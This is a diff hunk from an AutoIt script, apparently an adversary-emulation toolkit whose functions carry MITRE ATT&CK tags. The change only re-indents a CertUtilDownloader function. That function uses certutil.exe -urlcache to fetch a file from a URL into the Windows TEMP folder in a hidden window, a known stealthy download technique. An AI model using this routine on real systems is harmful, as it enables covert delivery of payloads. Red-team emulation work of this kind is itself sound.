@@ -332,5 +332,5 @@ Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
 EndFunc
 
 Func CertUtilDownloader($url, $fname) ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
-	RunWait("certutil.exe -urlcache -f " & $url & " C:\WINDOWS\TEMP\" & $fname,"" ,@SW_HIDE)
+   RunWait("certutil.exe -urlcache -f " & $url & " C:\WINDOWS\TEMP\" & $fname,"" ,@SW_HIDE)
 EndFunc
